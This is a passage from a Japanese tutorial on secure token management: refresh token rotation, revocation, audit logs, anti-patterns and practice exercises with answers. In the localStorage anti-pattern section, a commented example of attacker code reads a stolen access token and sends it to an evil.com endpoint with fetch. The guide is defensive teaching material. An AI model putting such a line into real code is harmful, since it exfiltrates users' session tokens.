          message: `Impossible travel detected: ${distance}km in ${timeDiff / 1000}s`,
          metadata: { fromIp: lastRefresh.ip, toIp: current.ip },
        });
      }
    }
  }

  private async getLastRefresh(userId: string) {
    const key = `token:refresh:${userId}`;
    const entries = await this.redis.zrevrange(key, 1, 1);
    return entries[0] ? JSON.parse(entries[0]) : null;
  }

  private async calculateGeoDistance(ip1: string, ip2: string): Promise<number> {
    // GeoIP ルックアップ（MaxMind GeoLite2 など）
    // 簡略化のため省略
    return 0;
  }
}
```

### 7.3 監査ログの実装

```typescript
// トークン操作の監査ログ
interface TokenAuditLog {
  id: string;
  userId: string;
  action: 'token_issued' | 'token_refreshed' | 'token_revoked' |
          'token_reuse_detected' | 'all_tokens_revoked' | 'session_expired';
  familyId?: string;
  ipAddress: string;
  userAgent: string;
  metadata?: Record<string, unknown>;
  createdAt: Date;
}

class TokenAuditService {
  constructor(private db: PrismaClient) {}

  async log(entry: Omit<TokenAuditLog, 'id' | 'createdAt'>) {
    await this.db.tokenAuditLog.create({
      data: {
        ...entry,
        metadata: entry.metadata ? JSON.stringify(entry.metadata) : null,
      },
    });
  }

  // ユーザーのトークンアクティビティ一覧
  async getUserActivity(userId: string, options: {
    limit?: number;
    offset?: number;
    action?: string;
  } = {}) {
    return this.db.tokenAuditLog.findMany({
      where: {
        userId,
        ...(options.action ? { action: options.action } : {}),
      },
      orderBy: { createdAt: 'desc' },
      take: options.limit ?? 50,
      skip: options.offset ?? 0,
    });
  }

  // 不審なアクティビティの検索
  async findSuspiciousActivity(timeWindow: number = 24 * 60 * 60 * 1000) {
    const since = new Date(Date.now() - timeWindow);

    return this.db.tokenAuditLog.groupBy({
      by: ['userId', 'action'],
      where: {
        action: { in: ['token_reuse_detected', 'all_tokens_revoked'] },
        createdAt: { gte: since },
      },
      _count: true,
      orderBy: { _count: { action: 'desc' } },
    });
  }
}
```

---

## 8. サーバー側リフレッシュエンドポイントの実装

```typescript
// Next.js API Route: /api/auth/refresh
import { NextRequest, NextResponse } from 'next/server';

const tokenService = new TokenRotationService(prisma, logger);
const auditService = new TokenAuditService(prisma);

export async function POST(request: NextRequest) {
  // Refresh Token を Cookie から取得
  const refreshToken = request.cookies.get('refresh_token')?.value;

  if (!refreshToken) {
    return NextResponse.json(
      { error: 'Refresh token not found' },
      { status: 401 }
    );
  }

  const clientInfo = {
    ip: request.headers.get('x-forwarded-for') ||
        request.headers.get('x-real-ip') ||
        'unknown',
    userAgent: request.headers.get('user-agent') || 'unknown',
  };

  try {
    // トークンリフレッシュ（Rotation 付き）
    const tokens = await tokenService.refreshTokens(refreshToken, clientInfo);

    // 監査ログ
    const payload = await verifyAccessToken(tokens.accessToken);
    await auditService.log({
      userId: payload.sub as string,
      action: 'token_refreshed',
      ipAddress: clientInfo.ip,
      userAgent: clientInfo.userAgent,
    });

    // 新しいトークンを Cookie にセット
    const response = NextResponse.json({
      expiresIn: 900, // 15分（秒）
    });

    return setTokenCookies(response, tokens);
  } catch (error) {
    if (error instanceof AuthError) {
      // 失敗時は Cookie をクリア
      const response = NextResponse.json(
        { error: error.message },
        { status: 401 }
      );
      return clearTokenCookies(response);
    }
    throw error;
  }
}
```

---

## 9. アンチパターン

### 9.1 localStorage にトークンを保存する

```typescript
// NG: localStorage にトークンを保存
// XSS 攻撃でトークンが盗まれる

// ✗ 危険なパターン
function loginBad(credentials: { email: string; password: string }) {
  fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify(credentials),
  })
    .then((res) => res.json())
    .then((data) => {
      // NG: localStorage に保存
      localStorage.setItem('accessToken', data.accessToken);
      localStorage.setItem('refreshToken', data.refreshToken);
    });
}

// XSS 攻撃者のコード（localStorage を読む）
// 攻撃者が XSS を仕掛けた場合:
// const stolen = localStorage.getItem('accessToken');
// fetch('https://evil.com/steal', { body: stolen });

// ✓ 安全なパターン: HttpOnly Cookie
async function loginGood(credentials: { email: string; password: string }) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(credentials),
    credentials: 'include', // Cookie を受け取る
  });

  if (res.ok) {
    // トークンは HttpOnly Cookie に自動保存される
    // JavaScript からはアクセスできない（XSS 耐性）
    window.location.href = '/dashboard';
  }
}
```

### 9.2 Refresh Token を回転させない

```typescript
// NG: RT を再利用し続ける
async function refreshBad(refreshToken: string) {
  const user = await validateRefreshToken(refreshToken);

  // NG: 同じ RT をそのまま再利用
  const newAccessToken = await issueAccessToken(user.id, user.role);
  return { accessToken: newAccessToken, refreshToken }; // 同じ RT
}
// RT が漏洩した場合、攻撃者が永久に AT を取得可能

// ✓ OK: RT Rotation で毎回新しい RT を発行
async function refreshGood(refreshToken: string) {
  // 使用済みチェック、ファミリー管理を含む完全な Rotation
  return tokenService.refreshTokens(refreshToken, clientInfo);
}
```

### 9.3 トークンをURLに含める

```typescript
// NG: クエリパラメータにトークンを含める
// → ブラウザ履歴、サーバーログ、Referrer ヘッダーで漏洩

// ✗ 危険
const url = `https://api.example.com/data?token=${accessToken}`;
// アクセスログ: GET /data?token=eyJhbGci... が記録される

// ✓ 安全: Authorization ヘッダーまたは Cookie で送信
const response = await fetch('https://api.example.com/data', {
  headers: {
    Authorization: `Bearer ${accessToken}`,
  },
});
```

### 9.4 RT をハッシュ化せずに保存する

```typescript
// NG: 平文で DB に保存
await db.refreshToken.create({
  data: {
    token: refreshToken, // ✗ 平文
    userId,
  },
});
// DB が漏洩した場合、全ユーザーのセッションが乗っ取られる

// ✓ OK: ハッシュ化して保存
await db.refreshToken.create({
  data: {
    token: hashToken(refreshToken), // ✓ SHA-256 ハッシュ
    userId,
  },
});
```

---

## 10. セキュリティベストプラクティスまとめ

```
トークン管理の包括的チェックリスト:

  ✓ 生成:
    → 暗号的に安全なランダム値（crypto.randomBytes(32)）
    → 十分なエントロピー（256ビット以上）
    → JWT の JTI を一意に（crypto.randomUUID()）

  ✓ 保存:
    → サーバー: RT はハッシュ化して保存（平文は保存しない）
    → ブラウザ: HttpOnly Cookie（localStorage は使わない）
    → モバイル: Secure Enclave / Keychain / KeyStore
    → メモリ: AT をメモリ変数に保持するパターンも検討

  ✓ 送信:
    → HTTPS のみ（TLS 必須）
    → Cookie: Secure + HttpOnly + SameSite=Lax/Strict
    → Authorization ヘッダー: Bearer スキーム
    → URL クエリパラメータには含めない

  ✓ 検証:
    → アルゴリズムを明示的に指定（alg: 'none' 攻撃を防止）
    → issuer, audience を検証
    → 有効期限を必ず検証
    → ブラックリスト/バージョンを確認

  ✓ 失効:
    → ログアウト時に RT を削除
    → パスワード変更時に全トークン無効化
    → 異常検知時にファミリー全体を無効化
    → 退職者のアカウントで即時全トークン失効

  ✓ 監視:
    → リフレッシュ頻度の監視
    → RT 再利用検知のアラート
    → 地理的異常（Impossible Travel）の検知
    → 監査ログの定期レビュー

  ✗ やってはいけないこと:
    → トークンを URL クエリパラメータに含める
    → トークンをアプリケーションログに出力
    → 平文で DB に保存
    → localStorage に保存
    → フロントエンドでトークンをデコードして認可判定
    → RT を Rotation せずに再利用
    → AT と RT に同じ有効期限を設定
```

---

## 実践演習

### 演習1: 基礎 - Refresh Token Rotation の実装

**課題**: 以下の要件を満たす Token Rotation サービスを実装してください。

1. ログイン時に AT + RT のペアを発行する
2. リフレッシュ時に新しい AT + RT を発行し、古い RT を無効化する
3. 既に使用済みの RT が使われた場合、そのファミリーの全 RT を無効化する

```typescript
// テンプレート
class SimpleTokenRotation {
  // ログイン時のトークン発行
  async login(userId: string): Promise<{ accessToken: string; refreshToken: string }> {
    // TODO: 実装してください
    throw new Error('Not implemented');
  }

  // トークンリフレッシュ
  async refresh(refreshToken: string): Promise<{ accessToken: string; refreshToken: string }> {
    // TODO: 実装してください
    throw new Error('Not implemented');
  }

  // ログアウト
  async logout(refreshToken: string): Promise<void> {
    // TODO: 実装してください
    throw new Error('Not implemented');
  }
}
```

<details>
<summary>模範解答</summary>

```typescript
import crypto from 'crypto';
import { SignJWT } from 'jose';

// インメモリストア（本番では DB を使用）
const tokenStore = new Map<string, {
  userId: string;
  familyId: string;
  usedAt: Date | null;
  expiresAt: Date;
}>();

function hashToken(token: string): string {
  return crypto.createHash('sha256').update(token).digest('hex');
}

const JWT_SECRET = new TextEncoder().encode('your-secret-key-at-least-32-chars');

class SimpleTokenRotation {
  async login(userId: string): Promise<{ accessToken: string; refreshToken: string }> {
    const familyId = crypto.randomUUID();
    const accessToken = await this.issueAT(userId);
    const refreshToken = crypto.randomBytes(32).toString('hex');

    tokenStore.set(hashToken(refreshToken), {
      userId,
      familyId,
      usedAt: null,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    });

    return { accessToken, refreshToken };
  }

  async refresh(refreshToken: string): Promise<{ accessToken: string; refreshToken: string }> {
    const hashedRT = hashToken(refreshToken);
    const record = tokenStore.get(hashedRT);

    if (!record) {
      throw new Error('Invalid refresh token');
    }

    if (record.expiresAt < new Date()) {
      tokenStore.delete(hashedRT);
      throw new Error('Refresh token expired');
    }

    // 再利用検知
    if (record.usedAt) {
      // ファミリー全体を無効化
      for (const [key, val] of tokenStore.entries()) {
        if (val.familyId === record.familyId) {
          tokenStore.delete(key);
        }
      }
      throw new Error('Token reuse detected! All sessions revoked.');
    }

    // 現在の RT を使用済みにマーク
    record.usedAt = new Date();

    // 新しいトークンペアを発行
    const newAccessToken = await this.issueAT(record.userId);
    const newRefreshToken = crypto.randomBytes(32).toString('hex');

    tokenStore.set(hashToken(newRefreshToken), {
      userId: record.userId,
      familyId: record.familyId, // 同じファミリー
      usedAt: null,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    });

    return { accessToken: newAccessToken, refreshToken: newRefreshToken };
  }

  async logout(refreshToken: string): Promise<void> {
    const hashedRT = hashToken(refreshToken);
    const record = tokenStore.get(hashedRT);

    if (record) {
      // ファミリー全体を削除
      for (const [key, val] of tokenStore.entries()) {
        if (val.familyId === record.familyId) {
          tokenStore.delete(key);
        }
      }
    }
  }

  private async issueAT(userId: string): Promise<string> {
    return new SignJWT({ sub: userId, type: 'access' })
      .setProtectedHeader({ alg: 'HS256' })
      .setExpirationTime('15m')
      .setJti(crypto.randomUUID())
      .sign(JWT_SECRET);
  }
}

// テスト
async function test() {
  const service = new SimpleTokenRotation();

  // ログイン
  const { accessToken, refreshToken } = await service.login('user_1');
  console.log('Login OK:', !!accessToken, !!refreshToken);

  // リフレッシュ
  const tokens2 = await service.refresh(refreshToken);
  console.log('Refresh OK:', !!tokens2.accessToken, !!tokens2.refreshToken);

  // 古い RT で再利用を試みる
  try {
    await service.refresh(refreshToken);
    console.log('ERROR: Should have thrown');
  } catch (e) {
    console.log('Reuse detected OK:', (e as Error).message);
  }

  // 新しい RT も無効化されているか確認
  try {
    await service.refresh(tokens2.refreshToken);
    console.log('ERROR: Should have thrown');
  } catch (e) {
    console.log('Family revoked OK:', (e as Error).message);
  }
}

test();
```

</details>

### 演習2: 応用 - ブラックリストとToken Versionのハイブリッド失効

**課題**: 以下の要件を満たす複合的な失効メカニズムを実装してください。

1. 通常のログアウト: RT 削除のみ
2. パスワード変更: Token Version をインクリメントし、全 RT を削除
3. セキュリティインシデント: ブラックリストに追加して即時失効

```typescript
// テンプレート
class HybridRevocation {
  // 通常ログアウト
  async logout(userId: string, familyId: string): Promise<void> {
    // TODO
  }

  // パスワード変更
  async onPasswordChange(userId: string): Promise<void> {
    // TODO
  }

  // 即時失効（セキュリティインシデント）
  async emergencyRevoke(userId: string): Promise<void> {
    // TODO
  }

  // トークン検証（3層チェック）
  async verifyToken(token: string): Promise<any> {
    // TODO
  }
}
```

<details>
<summary>模範解答</summary>

```typescript
import { jwtVerify } from 'jose';

// インメモリストア（本番では Redis + DB）
const blacklist = new Map<string, number>(); // JTI -> expiry timestamp
const userBlacklist = new Map<string, number>(); // userId -> revoked timestamp
const tokenVersions = new Map<string, number>(); // userId -> version
const refreshTokens = new Map<string, { userId: string; familyId: string }>();

const JWT_SECRET = new TextEncoder().encode('your-secret-key-at-least-32-chars');

class HybridRevocation {
  // 通常ログアウト: RT 削除のみ（AT は自然失効を待つ）
  async logout(userId: string, familyId: string): Promise<void> {
    for (const [key, val] of refreshTokens.entries()) {
      if (val.userId === userId && val.familyId === familyId) {
        refreshTokens.delete(key);
      }
    }
    console.log(`Logout: Revoked session ${familyId} for user ${userId}`);
  }

  // パスワード変更: Token Version + RT 全削除
  async onPasswordChange(userId: string): Promise<void> {
    // Token Version をインクリメント
    const currentVersion = tokenVersions.get(userId) || 0;
    tokenVersions.set(userId, currentVersion + 1);

    // 全 RT を削除
    for (const [key, val] of refreshTokens.entries()) {
      if (val.userId === userId) {
        refreshTokens.delete(key);
      }
    }
    console.log(`Password changed: Version bumped to ${currentVersion + 1}`);
  }

  // 即時失効: ブラックリスト（AT が有効期限内でも即座に失効）
  async emergencyRevoke(userId: string): Promise<void> {
    // ユーザー単位のブラックリスト
    userBlacklist.set(userId, Date.now());

    // 全 RT も削除
    for (const [key, val] of refreshTokens.entries()) {
      if (val.userId === userId) {
        refreshTokens.delete(key);
      }
    }

    // Token Version もインクリメント
    const currentVersion = tokenVersions.get(userId) || 0;
    tokenVersions.set(userId, currentVersion + 1);

    console.log(`Emergency: User ${userId} fully revoked`);
  }

  // トークン検証（3層チェック）
  async verifyToken(token: string): Promise<any> {
    // Layer 1: JWT 署名検証
    const { payload } = await jwtVerify(token, JWT_SECRET);
    const userId = payload.sub as string;

    // Layer 2: ブラックリストチェック（即時失効）
    const revokedAt = userBlacklist.get(userId);
    if (revokedAt && (payload.iat as number) * 1000 < revokedAt) {
      throw new Error('Token revoked (blacklist)');
    }

    const jtiRevoked = blacklist.has(payload.jti as string);
    if (jtiRevoked) {
      throw new Error('Token revoked (individual blacklist)');
    }

    // Layer 3: Token Version チェック（準即時失効）
    const currentVersion = tokenVersions.get(userId) || 0;
    if (payload.token_version !== undefined &&
        payload.token_version !== currentVersion) {
      throw new Error('Token revoked (version mismatch)');
    }

    return payload;
  }
}

// テスト
async function testHybridRevocation() {
  const revocation = new HybridRevocation();

  // シナリオ1: 通常ログアウト
  refreshTokens.set('rt1', { userId: 'user1', familyId: 'f1' });
  refreshTokens.set('rt2', { userId: 'user1', familyId: 'f2' });
  await revocation.logout('user1', 'f1');
  console.log('After logout - remaining RTs:', refreshTokens.size); // 1

  // シナリオ2: パスワード変更
  refreshTokens.set('rt3', { userId: 'user2', familyId: 'f3' });
  refreshTokens.set('rt4', { userId: 'user2', familyId: 'f4' });
  await revocation.onPasswordChange('user2');
  console.log('After password change - user2 version:', tokenVersions.get('user2'));

  // シナリオ3: 緊急失効
  await revocation.emergencyRevoke('user3');
  console.log('After emergency - user3 blacklisted at:', userBlacklist.get('user3'));
}

testHybridRevocation();
```

</details>

### 演習3: 発展 - トークン監視ダッシュボードの実装

**課題**: 管理者向けのトークン監視 API を設計・実装してください。

1. ユーザーのアクティブセッション一覧を返す API
2. 不審なアクティビティを検出するロジック
3. セッションの個別・一括失効 API

<details>
<summary>模範解答</summary>

```typescript
import { NextRequest, NextResponse } from 'next/server';

// セッション管理 API
// GET /api/admin/sessions/:userId
export async function getSessionsForUser(
  request: NextRequest,
  { params }: { params: { userId: string } }
) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const manager = new TokenFamilyManager(prisma);
  const sessions = await manager.getActiveSessions(params.userId);

  return NextResponse.json({ sessions });
}

// DELETE /api/admin/sessions/:userId/:familyId
export async function revokeSession(
  request: NextRequest,
  { params }: { params: { userId: string; familyId: string } }
) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const manager = new TokenFamilyManager(prisma);
  const result = await manager.revokeSession(params.userId, params.familyId);

  // 監査ログ
  await auditService.log({
    userId: params.userId,
    action: 'token_revoked',
    ipAddress: request.headers.get('x-forwarded-for') || 'unknown',
    userAgent: request.headers.get('user-agent') || 'unknown',
    metadata: {
      revokedBy: session.user.id,
      familyId: params.familyId,
      revokedCount: result.revokedCount,
    },
  });

  return NextResponse.json(result);
}

// DELETE /api/admin/sessions/:userId (全セッション失効)
export async function revokeAllSessions(
  request: NextRequest,
  { params }: { params: { userId: string } }
) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const manager = new TokenFamilyManager(prisma);
  const result = await manager.revokeAllSessions(params.userId);

  // ブラックリストにも追加（即時失効）
  const blacklistService = new TokenBlacklist(process.env.REDIS_URL!);
  await blacklistService.revokeAllForUser(params.userId);

  return NextResponse.json({
    ...result,
    message: `All ${result.revokedCount} sessions revoked for user ${params.userId}`,
  });
}

// GET /api/admin/security/suspicious-activity
export async function getSuspiciousActivity(request: NextRequest) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const auditService = new TokenAuditService(prisma);

  // 直近24時間の不審なアクティビティ
  const suspicious = await auditService.findSuspiciousActivity(24 * 60 * 60 * 1000);

  // リフレッシュ頻度が高いユーザー
  const highFrequency = await prisma.$queryRaw`
    SELECT "userId", COUNT(*) as count
    FROM "TokenAuditLog"
    WHERE action = 'token_refreshed'
      AND "createdAt" > NOW() - INTERVAL '1 hour'
    GROUP BY "userId"
    HAVING COUNT(*) > 10
    ORDER BY count DESC
    LIMIT 20
  `;

  return NextResponse.json({
    tokenReuseDetections: suspicious.filter(
      (s: any) => s.action === 'token_reuse_detected'
    ),
    massRevocations: suspicious.filter(
      (s: any) => s.action === 'all_tokens_revoked'
    ),
    highRefreshFrequency: highFrequency,
    analyzedPeriod: '24h',
  });
}
```

</details>

---

## FAQ

### Q1: Access Token の有効期限は何分が最適ですか？

一般的なWebアプリケーションでは15分が推奨されます。この値は「漏洩時の被害を最小化する」と「ユーザー体験を損なわない」のバランスポイントです。金融・医療系では5分、ソーシャルメディアでは1時間など、業界やリスクレベルに応じて調整します。重要なのは、AT の有効期限だけでセキュリティを担保しないことです。Token Version やブラックリストと組み合わせることで、即時失効が必要な場面にも対応できます。

### Q2: Refresh Token はなぜ JWT ではなく不透明トークン（ランダム文字列）が推奨ですか？

RT はサーバー側で必ず DB を参照して検証するため、JWT の「ステートレス検証」の利点がありません。むしろ JWT にすると、ペイロードにユーザー情報が含まれるため、漏洩時のリスクが増えます。不透明トークン（crypto.randomBytes）は情報を含まず、DB のハッシュと照合するだけなので、よりセキュアです。

### Q3: Token Rotation で同時にリフレッシュリクエストが来た場合はどうなりますか？

同じ RT で同時に複数のリフレッシュリクエストが来ると、2番目のリクエストが「再利用検知」されてファミリー全体が無効化される可能性があります。これを防ぐには、クライアント側でリフレッシュの同時実行を制御します（セクション3.1の `isRefreshing` フラグ参照）。サーバー側では、RT の `usedAt` をチェックする際に短い猶予期間（例: 10秒）を設けることで、ネットワーク遅延による誤検知を防ぐこともできます。

### Q4: ログアウト時に AT も即座に無効化する必要がありますか？

理想的にはYesですが、AT はステートレスなため即時失効にはブラックリスト（Redis）が必要です。多くのアプリケーションでは、ログアウト時は RT の削除のみで十分です（AT は最大15分で自然失効）。ただし、金融・医療・高セキュリティ環境では、AT もブラックリストに追加して即時失効させるべきです。

### Q5: マルチデバイス対応ではどのように Token Family を管理しますか？

各デバイスのログインごとに独立した familyId を発行します。ユーザーが iPhone でログインすれば familyId=A、PC でログインすれば familyId=B が発行されます。ログアウト時は該当 familyId の RT のみ削除し、他のデバイスのセッションは維持されます。「全デバイスからログアウト」機能では、そのユーザーの全 familyId の RT を削除します。

---

## まとめ

| 項目 | 推奨設定・方針 |
|------|-------------|
| Access Token 期限 | 15分（業界に応じて 5分〜1時間） |
| Refresh Token 期限 | 7日（モバイルは最大90日） |
| RT Rotation | 必須。1回使用で新 RT 発行 |
| 再利用検知 | ファミリー全体を即時無効化 |
| AT 保存場所 | HttpOnly Cookie（path=/api） |
| RT 保存場所 | HttpOnly Cookie（path=/api/auth） |
| RT の DB 保存 | SHA-256 ハッシュ化して保存 |
| 失効方式 | Token Version + ブラックリスト（複合） |
| 監視 | リフレッシュ頻度、Impossible Travel、RT 再利用検知 |
| CSRF 対策 | SameSite=Lax/Strict + CSRF トークン |

---

## 次に読むべきガイド

- [RBAC（ロールベースアクセス制御）](../03-authorization/00-rbac.md) - トークンに含めるロール情報の設計
- [API 認可](../03-authorization/02-api-authorization.md) - トークンを使った API アクセス制御
- [セキュリティの基礎](../../security-fundamentals/docs/00-basics/) - 暗号化とハッシュの基礎

---

## 参考文献

1. Auth0. "Refresh Token Rotation." auth0.com/docs, 2024.
2. RFC 6749 §1.5. "Refresh Token." IETF, 2012.
3. RFC 6750. "The OAuth 2.0 Authorization Framework: Bearer Token Usage." IETF, 2012.
4. OWASP. "JSON Web Token Cheat Sheet." cheatsheetseries.owasp.org, 2024.
5. OWASP. "Session Management Cheat Sheet." cheatsheetseries.owasp.org, 2024.
6. NIST SP 800-63B. "Digital Identity Guidelines: Authentication and Lifecycle Management." 2020.
